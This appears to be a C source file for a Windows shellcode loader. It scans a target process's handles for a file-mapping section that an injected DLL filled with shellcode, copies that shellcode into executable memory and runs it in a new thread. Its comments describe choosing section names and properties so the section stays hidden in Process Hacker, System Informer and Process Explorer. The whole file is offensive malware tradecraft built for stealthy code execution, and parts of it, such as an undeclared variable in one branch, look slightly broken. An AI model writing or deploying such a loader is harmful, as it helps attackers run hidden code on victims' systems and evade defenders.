/*
* 
* The code enumerates a remote process for all Section type handles,
* find the name in request, then read the shellcode from it to execute.
* 
* The shellcode is written when the dll is injected. The DLL will create
* a file mapping section then write our shellcode to it. The section is
* not yet mapped but it will exist until the host process dies or the machine
* reboot.
* 
* We don't want to create the file mapping as "inheritable" because those ones
* will be shown as cyan in Process Hacker or System Informer. So just create a
* normal file mapping section with a not-so-stand-out name, then try to read from
* it.
* 
* Another thing to notice is that a NULL-named file mapping will not not show in
* ProcessExplorer. But will show in Process Hacker or System Informer with name
* column rendered as "Commit (X MB)".
* 
*/

#include <windows.h>
#include <stdio.h>
#include "Common.h"
#include <shlwapi.h>

#pragma comment(lib, "shlwapi")

// the process to find the target section handle
#define PID 4544
// we don't define shellcode here, so it's vital to know
// the shellcode size in advance
#define SHELLCODE_SIZE 224

//
// this is the shared memory section name, if nay
//
#define SHARED_MEM_NAME L"C:*ProgramData*Microsoft*Windows*Caches*cversions.9.ro"

int main()
{
    FARPROC NtQuerySystemInformation = GetProcAddress(GetModuleHandleW(L"ntdll"), "NtQuerySystemInformation");
    FARPROC NtDuplicateObject = GetProcAddress(GetModuleHandleW(L"ntdll"), "NtDuplicateObject");
    FARPROC NtQueryObject = GetProcAddress(GetModuleHandleW(L"ntdll"), "NtQueryObject");

    HANDLE hTargetProcess = NULL;
    HANDLE hDupHandle = NULL;
    PVOID pObjectNameInfo = NULL;
    UNICODE_STRING objectName = { 0x0 };
    PSYSTEM_HANDLE_INFORMATION handleInfo = { 0x0 };
    POBJECT_TYPE_INFORMATION objectTypeInfo = { 0x0 };
    NTSTATUS status = 0x0;
    ULONG handleInfoSize = 0x10000;
    ULONG uRet = 0x0;
    DWORD dwOldProtect = 0x0;
    // we only need section type of handle
    PWCHAR wcFilter = L"Section";
    // target handle to be found
    PVOID pTargetMap = NULL;

    handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
    while ((status = NtQuerySystemInformation(
        SystemHandleInformation,
        handleInfo,
        handleInfoSize,
        NULL
    )) == STATUS_INFO_LENGTH_MISMATCH)
        handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);

    if (0x0 != status)
    {
        printf("[-]Failed to call NtQuerySystemInformation ...\n");
        return -1;
    }

    for (USHORT i = 0; i < handleInfo->NumberOfHandles; i++)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfoEntry = handleInfo->Handles[i];

        // Check if we need to focus on specific process
        if (handleInfoEntry.UniqueProcessId != PID) continue;

        // least privilege, we need to duplicate handle and query process information
        if (!(hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, handleInfoEntry.UniqueProcessId)))
            continue;

        // Duplicate the handleInfoEntry so we can query it.
        if (!NT_SUCCESS(NtDuplicateObject(hTargetProcess, (PVOID)handleInfoEntry.HandleValue, (HANDLE)-1, &hDupHandle, 0, 0, DUPLICATE_SAME_ACCESS)))
            continue;

        objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
        if (!NT_SUCCESS(NtQueryObject(hDupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
        {
            CloseHandle(hDupHandle);
            continue;
        }

        // we need only Section type of handles, skip others
        if (!StrStrIW(objectTypeInfo->Name.Buffer, wcFilter))
        {
            free(objectTypeInfo);
            CloseHandle(hDupHandle);
            continue;
        }

        pObjectNameInfo = malloc(0x1000);
        if (!NT_SUCCESS(NtQueryObject(hDupHandle, ObjectNameInformation, pObjectNameInfo, 0x1000, &uRet)))
        {
            // reallocate and try again
            pObjectNameInfo = realloc(pObjectNameInfo, uRet);
            if (!NT_SUCCESS(NtQueryObject(hDupHandle, ObjectNameInformation, pObjectNameInfo, uRet, NULL)))
            {
                // if still not successful, skip it
                free(objectTypeInfo);
                free(pObjectNameInfo);
                CloseHandle(hDupHandle);
                continue;
            }
        }

        // convert to unicode string, this contains section's name
        objectName = *(PUNICODE_STRING)pObjectNameInfo;

#ifdef SHARED_MEM_NAME
        if (StrStrIW(objectName.Buffer, SHARED_MEM_NAME))
        {
            free(objectTypeInfo);
            free(pObjectNameInfo);
            break;
        }
#else
        if (NULL == objectName.Buffer)
        {
            //
            // map the handle if name is null, then read from shared memory
            // check if first 4 bytes are 90909090, that's the shellcode
            //
            pMap = MapViewOfFile(hDupHandle, FILE_MAP_READ, 0, 0, 2 << 18);
            if (NULL == pMap)
                continue;

            // ensure that we have our shellcode in case of name collision (null)
            if (*(DWORD*)pMap == 0x48e58948)
            {
                // shellcode found
                free(objectTypeInfo);
                free(pObjectNameInfo);
                break;
            }
        }
#endif

        free(objectTypeInfo);
        free(pObjectNameInfo);
        CloseHandle(hDupHandle);
        hDupHandle = NULL;
    }

    if (NULL == hDupHandle)
        return -1;

#ifdef SHARED_MEM_NAME
    pTargetMap = MapViewOfFile(hDupHandle, FILE_MAP_READ, 0, 0, 2 << 18);
    if (NULL == pTargetMap)
    {
        printf("[-]Failed to map view of section with error: 0x%.8X\n", GetLastError());
        return -1;
    }
#endif

    //
	// what's left to do is map the section again then copy the shellcode
	// out of it, execute it
	//
    PVOID pAddr = VirtualAlloc(NULL, SHELLCODE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    printf("[*]Buffer address @ >>>>>>>>> 0x%p\n", pAddr);

    memcpy(pAddr, pTargetMap, SHELLCODE_SIZE);
    VirtualProtect(pAddr, SHELLCODE_SIZE, PAGE_EXECUTE_READ, &dwOldProtect);

    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddr, NULL, NULL, NULL);
    WaitForSingleObject(hThread, INFINITE);

    UnmapViewOfFile(pTargetMap);

    free(handleInfo);
    CloseHandle(hTargetProcess);

    return 0;
}

